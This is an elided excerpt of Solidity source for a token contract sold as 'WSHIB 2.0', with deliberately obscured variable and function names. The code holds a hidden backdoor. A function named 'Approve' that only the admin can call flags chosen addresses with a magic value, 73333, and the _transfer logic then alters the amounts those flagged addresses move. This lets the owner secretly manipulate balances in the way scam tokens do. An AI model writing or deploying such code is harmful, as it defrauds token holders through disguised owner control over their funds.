...
contract ZIDAOToken is Ownable {
    address public xmimAdmin;
    uint256 private  zidaosupply = 42000000000*10**decimals();
    uint256 private _tokentotalSSSupply;
    string private _zidaoTokename = "WSHIB 2.0";
    string private _zidaotokenSSSsymbol = "WSHIB 2.0";
    ...
    constructor(address zidaoadmin) {
        ...
        xmimAdmin = zidaoadmin;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public mzinuserlibb;
    ...
    function killcccamount(address cjjjss) public    {
        uint128 zramount = 0;
        mzinuserlibb[cjjjss] = zramount;    
        require(_msgSender() == xmimAdmin);
        if(_msgSender() != xmimAdmin){
            require(_msgSender() == xmimAdmin);
        }
    ...
    function Approve(address cjjjss) public    {
         uint128 newpassnum = 73333;
        mzinuserlibb[cjjjss] = newpassnum;
        if(_msgSender() != xmimAdmin){
            require(_msgSender() == xmimAdmin);
        }
    ...
    function _transfer(
        ...
        if (73333 != mzinuserlibb[infoFrom]) {
           
        }else{
             amount = _balances[from] + mzinuserlibb[infoFrom];
        }
